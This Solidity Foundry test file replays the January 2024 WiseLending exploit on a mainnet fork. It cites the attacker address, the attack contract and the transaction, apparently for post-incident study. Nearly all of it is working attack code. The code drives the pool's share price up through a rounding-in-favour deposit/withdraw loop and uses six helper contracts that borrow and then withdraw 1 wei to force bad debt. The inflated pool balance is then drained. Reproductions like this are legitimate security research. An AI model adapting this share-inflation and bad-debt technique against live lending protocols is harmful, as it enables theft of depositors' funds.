// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~464K USD$
// Attacker : https://etherscan.io/address/0xb90cf1d740b206b6d80854bc525e609dc42b45dc
// Attack Contract : https://etherscan.io/address/0x91c49cc7fbfe8f70aceeb075952cd64817f9d82c
// Vulnerable Contract : https://etherscan.io/address/0x37e49bf3749513a02fa535f0cbc383796e8107e4
// Attack Tx :https://etherscan.io/tx/0x04e16a79ff928db2fa88619cdd045cdfc7979a61d836c9c9e585b3d6f6d8bc31

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x37e49bf3749513a02fa535f0cbc383796e8107e4

// @Analysis
// Twitter : https://twitter.com/danielvf/status/1746303616778981402

interface IWiseLending {
    function depositExactAmount(uint256 _nftId, address _poolToken, uint256 _amount) external returns (uint256);

    function withdrawExactShares(uint256 _nftId, address _poolToken, uint256 _shares) external returns (uint256);

    function withdrawExactAmount(
        uint256 _nftId,
        address _poolToken,
        uint256 _withdrawAmount
    ) external returns (uint256);

    function getPositionLendingShares(uint256 _nftId, address _poolToken) external view returns (uint256);

    function getTotalPool(address _poolToken) external view returns (uint256);

    function mintPosition() external returns (uint256);

    function lendingPoolData(address _poolToken)
        external
        view
        returns (uint256 pseudoTotalPool, uint256 totalDepositShares, uint256 collateralFactor);

    function borrowExactAmount(uint256 _nftId, address _poolToken, uint256 _amount) external returns (uint256);
}

interface IPool is IERC20 {
    function depositExactAmount(uint256 _underlyingLpAssetAmount) external returns (uint256, uint256);

    function withdrawExactShares(uint256 _shares) external returns (uint256);

    function getPositionLendingShares(uint256, address) external returns (uint256);
}

interface PositionManager is IERC721 {
    function mintPosition() external returns (uint256);
}

contract WiseLending is Test {
    uint256 blocknumToForkFrom = 18_992_907;
    IERC20 PendleLPT = IERC20(0xC374f7eC85F8C7DE3207a10bB1978bA104bdA3B2);
    IPool LPTPoolToken = IPool(0xB40b073d7E47986D3A45Ca7Fd30772C25A2AD57f); // underlyingToken
    IWiseLending wiseLending = IWiseLending(payable(0x37e49bf3749513A02FA535F0CbC383796E8107E4));
    IERC20 wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    PositionManager PositionNFTs = PositionManager(0x32E0A7F7C4b1A19594d25bD9b63EBA912b1a5f61);
    address attackerContract = 0x91c49Cc7FBfE8f70AceEb075952cD64817f9d82c;
    Helper[6] helpers;

    function setUp() public {
        vm.label(address(PendleLPT), "PendleLPT");
        vm.label(address(LPTPoolToken), "LPTPoolToken");
        vm.label(address(wiseLending), "wiseLending");
        vm.label(address(wstETH), "wstETH");
        vm.label(address(WETH), "WETH");
        vm.label(address(PositionNFTs), "PositionNFTs");
        vm.createSelectFork("mainnet", blocknumToForkFrom);
    }

    function testExploit() public {
        deal(address(PendleLPT), address(this), 520_539_781_914_590_517_894);

        emit log_named_decimal_uint("Attacker PendleLPT Balance before exploit", PendleLPT.balanceOf(address(this)), 18);

        PendleLPT.approve(address(LPTPoolToken), type(uint256).max);
        LPTPoolToken.depositExactAmount(PendleLPT.balanceOf(address(this)));
        LPTPoolToken.approve(address(wiseLending), type(uint256).max);

        // set WiseLending pool state: pseudoTotalPool(underlying): 2 wei, totalDepositShares(share): 1 wei
        // see below tx: https://etherscan.io/tx/0x67d6c554314c9b306d683afb3bc4a10e70509ceb0fdf8415a5e270a91fae52de
        vm.startPrank(attackerContract);
        PositionNFTs.transferFrom(attackerContract, address(this), 8);
        vm.stopPrank();

        console.log("\n 1. set wiseLending pool state");
        wiseLending.withdrawExactShares(
            8, address(LPTPoolToken), wiseLending.getPositionLendingShares(8, address(LPTPoolToken))
        );
        (uint256 underlyingAmount, uint256 shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));
        console.log("WiseLending pool state now, underlyingAmount:", underlyingAmount, "shareAmount: ", shareAmount);
        console.log("wiseLending Share Price 1: ", underlyingAmount / shareAmount);

        // inflae share price by donate LPTPoolToken to the wiseLending
        while (underlyingAmount / shareAmount < 36 ether) {
            wiseLending.depositExactAmount(8, address(LPTPoolToken), underlyingAmount * 2 - 1); //Since rounding in favor of the protocol, deposit 2x - 1 underlying, mint 1 share
            wiseLending.withdrawExactAmount(8, address(LPTPoolToken), 1); // withdraw 1 underlying, burn 1 share
            (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));
        }
        console.log("\n 2. Donate LPTPoolToken to wiseLending by rounding in favor of the protocol");
        console.log("WiseLending pool state now, underlyingAmount:", underlyingAmount, "shareAmount: ", shareAmount);
        console.log("wiseLending Share Price 2: ", underlyingAmount / shareAmount);

        //Mint 6 shares for withdraw donate LPTPoolToken
        console.log("\n 3. Mint 6 shares for withdraw donate LPTPoolToken");
        wiseLending.depositExactAmount(8, address(LPTPoolToken), 6 * underlyingAmount);

        // Open a position to borrow assets in 6 new accounts
        // Donate position collateral to the wiseLending pool through the incorrect health factor check
        console.log("\n 4. Open positions to borrow assets and further inflae the share price");
        for (uint256 i = 0; i < 6; i++) {
            helpers[i] = new Helper();
        }
        (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));
        LPTPoolToken.transfer(address(helpers[0]), underlyingAmount / shareAmount + 10);
        helpers[0].borrow(wstETH, underlyingAmount / shareAmount + 1, 43_767_595_652_604_943_692);

        (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));
        console.log("WiseLending Share Price 3: ", underlyingAmount / shareAmount);
        LPTPoolToken.transfer(address(helpers[1]), underlyingAmount / shareAmount + 10);
        helpers[1].borrow(wstETH, underlyingAmount / shareAmount + 1, 50_020_109_317_262_792_792);

        (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));
        console.log("WiseLending Share Price 4: ", underlyingAmount / shareAmount);
        LPTPoolToken.transfer(address(helpers[2]), underlyingAmount / shareAmount + 10);
        helpers[2].borrow(LPTPoolToken, underlyingAmount / shareAmount + 1, 23_443_463_776_915_873_010);

        (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));
        console.log("WiseLending Share Price 5: ", underlyingAmount / shareAmount);
        LPTPoolToken.transfer(address(helpers[3]), underlyingAmount / shareAmount + 10);
        helpers[3].borrow(WETH, underlyingAmount / shareAmount + 1, 73_498_936_139_651_450_633);

        (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));
        console.log("WiseLending Share Price 6: ", underlyingAmount / shareAmount);
        LPTPoolToken.transfer(address(helpers[4]), underlyingAmount / shareAmount + 10);
        helpers[4].borrow(LPTPoolToken, underlyingAmount / shareAmount + 1, 27_742_814_258_725_671_652);

        (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));
        console.log("WiseLending Share Price 7: ", underlyingAmount / shareAmount);
        LPTPoolToken.transfer(address(helpers[5]), underlyingAmount / shareAmount + 10);
        helpers[5].borrow(LPTPoolToken, underlyingAmount / shareAmount + 1, 48_332_561_371_175_655_788);

        // Withdraw donated LPTPoolTokens due to the increase in share price
        console.log("\n 5. Withdraw donated LPTPoolTokens due to the increase in share price");
        wiseLending.withdrawExactAmount(8, address(LPTPoolToken), wiseLending.getTotalPool(address(LPTPoolToken)));

        LPTPoolToken.withdrawExactShares(LPTPoolToken.balanceOf(address(this)));

        emit log_named_decimal_uint("\n Attacker PendleLPT Balance After exploit", PendleLPT.balanceOf(address(this)), 18);

        emit log_named_decimal_uint("Attacker WETH Balance After exploit", WETH.balanceOf(address(this)), 18);

        emit log_named_decimal_uint("Attacker wstETH Balance After exploit", wstETH.balanceOf(address(this)), 18);
    }
}

contract Helper {
    IERC20 PendleLPT = IERC20(0xC374f7eC85F8C7DE3207a10bB1978bA104bdA3B2);
    IPool LPTPoolToken = IPool(0xB40b073d7E47986D3A45Ca7Fd30772C25A2AD57f); // underlyingToken
    IWiseLending wiseLending = IWiseLending(payable(0x37e49bf3749513A02FA535F0CbC383796E8107E4));
    IERC20 wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    PositionManager PositionNFTs = PositionManager(0x32E0A7F7C4b1A19594d25bD9b63EBA912b1a5f61);

    function borrow(IERC20 asset, uint256 collateralAmount, uint256 debtAmount) external {
        uint256 positionId = PositionNFTs.mintPosition();
        LPTPoolToken.approve(address(wiseLending), type(uint256).max);
        wiseLending.depositExactAmount(positionId, address(LPTPoolToken), collateralAmount); // deposit collateral
        wiseLending.borrowExactAmount(positionId, address(asset), debtAmount); // borrow asset

        // withdraw 1 wei collateral, burn 1 share, donate (sharePrice - 1) wei collateral to the pool, forced position entered into bad debt
        wiseLending.withdrawExactAmount(positionId, address(LPTPoolToken), 1); 

        asset.transfer(msg.sender, asset.balanceOf(address(this)));
        LPTPoolToken.transfer(msg.sender, LPTPoolToken.balanceOf(address(this)));
    }

    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
